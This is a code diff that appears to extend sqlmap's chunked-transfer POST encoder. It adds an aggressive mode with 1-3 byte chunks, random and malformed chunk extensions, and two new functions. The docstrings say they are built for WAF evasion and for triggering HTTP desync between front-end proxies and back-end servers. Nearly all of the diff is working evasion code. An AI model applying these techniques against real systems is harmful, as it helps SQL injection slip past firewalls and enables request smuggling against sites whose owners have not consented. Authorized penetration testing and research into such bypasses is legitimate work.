@@ -5585,9 +5585,23 @@ def removePostHintPrefix(value):
     return re.sub(r"\A(%s) " % '|'.join(re.escape(__) for __ in getPublicTypeMembers(POST_HINT, onlyValues=True)), "", value)
 
 
-def chunkSplitPostData(data):
+def chunkSplitPostData(data, aggressive=False, use_extensions=True):
     """
     Convert POST data to chunked transfer-encoded data (Note: splitting done by SQL keywords)
+    
+    # Author: CyberVaca , Luis Vacas de Santos
+    # Twitter: https://twitter.com/CyberVaca_
+    # Based on the Alamot's original code
+    
+    Enhanced with WAF bypass techniques:
+        * Smaller chunk sizes (1-3 bytes) in aggressive mode
+        * Random chunk extensions to confuse parsers
+        * Malformed extensions for HTTP desync potential
+
+    Args:
+        data: The POST data to encode
+        aggressive: If True, uses very small chunks (1-3 bytes) for better WAF evasion
+        use_extensions: If True, adds random chunk extensions
 
     >>> random.seed(0)
     >>> chunkSplitPostData("SELECT username,password FROM users")
@@ -5597,14 +5611,32 @@ def chunkSplitPostData(data):
     length = len(data)
     retVal = []
     index = 0
+    
+    # Extension types for WAF confusion
+    extension_types = [
+        lambda: randomStr(5, alphabet=string.ascii_letters + string.digits),  # Standard salt
+        lambda: randomStr(random.randint(3, 8), alphabet=string.ascii_lowercase),  # Named extension
+        lambda: "%s=%s" % (randomStr(4, alphabet=string.ascii_lowercase), randomStr(6)),  # Key=value extension
+        lambda: "",  # Empty extension (bare semicolon - may cause desync)
+    ]
 
     while index < length:
-        chunkSize = randomInt(1)
+        # In aggressive mode, use very small chunks (1-3 bytes)
+        # This splits SQL keywords more effectively
+        if aggressive:
+            chunkSize = random.randint(1, 3)
+        else:
+            chunkSize = randomInt(1)
 
         if index + chunkSize >= length:
             chunkSize = length - index
 
-        salt = randomStr(5, alphabet=string.ascii_letters + string.digits)
+        # Generate chunk extension
+        if use_extensions:
+            ext_func = random.choice(extension_types)
+            extension = ext_func()
+        else:
+            extension = randomStr(5, alphabet=string.ascii_letters + string.digits)
 
         while chunkSize:
             candidate = data[index:index + chunkSize]
@@ -5616,8 +5648,81 @@ def chunkSplitPostData(data):
 
         index += chunkSize
 
-        # Append to list instead of recreating the string
-        retVal.append("%x;%s\r\n" % (chunkSize, salt))
+        # Format chunk with extension
+        if extension:
+            retVal.append("%x;%s\r\n" % (chunkSize, extension))
+        else:
+            # Bare semicolon (potential desync trigger)
+            retVal.append("%x;\r\n" % chunkSize)
+        retVal.append("%s\r\n" % candidate)
+
+    retVal.append("0\r\n\r\n")
+
+    return "".join(retVal)
+
+
+def chunkSplitPostDataAggressive(data):
+    """
+    Aggressive chunked encoding with very small chunks for maximum WAF evasion
+    
+    # Author: CyberVaca , Luis Vacas de Santos
+    # Twitter: https://twitter.com/CyberVaca_
+    # Based on the Alamot's original code
+    
+    This version uses 1-2 byte chunks to split SQL keywords mid-character,
+    making pattern matching nearly impossible for WAFs.
+    """
+    return chunkSplitPostData(data, aggressive=True, use_extensions=True)
+
+
+def chunkSplitPostDataDesync(data):
+    """
+    Chunked encoding designed to potentially trigger HTTP desync
+    
+    # Author: CyberVaca , Luis Vacas de Santos
+    # Twitter: https://twitter.com/CyberVaca_
+    # Based on the Alamot's original code
+    
+    Uses malformed chunk extensions that may cause parsing differences
+    between front-end proxies and back-end servers.
+    
+    Reference: https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/
+    """
+    
+    length = len(data)
+    retVal = []
+    index = 0
+    
+    # Malformed extension patterns that may cause desync
+    desync_extensions = [
+        "",           # Bare semicolon
+        " ",          # Space after semicolon
+        "\t",         # Tab after semicolon  
+        "=",          # Equals without name
+        ";;",         # Double semicolon
+    ]
+
+    while index < length:
+        chunkSize = random.randint(1, 5)
+
+        if index + chunkSize >= length:
+            chunkSize = length - index
+
+        # Use potentially desync-triggering extension
+        extension = random.choice(desync_extensions)
+
+        while chunkSize:
+            candidate = data[index:index + chunkSize]
+
+            if re.search(r"\b%s\b" % '|'.join(HTTP_CHUNKED_SPLIT_KEYWORDS), candidate, re.I):
+                chunkSize -= 1
+            else:
+                break
+
+        index += chunkSize
+
+        # Format with malformed extension
+        retVal.append("%x;%s\r\n" % (chunkSize, extension))
         retVal.append("%s\r\n" % candidate)
 
     retVal.append("0\r\n\r\n")
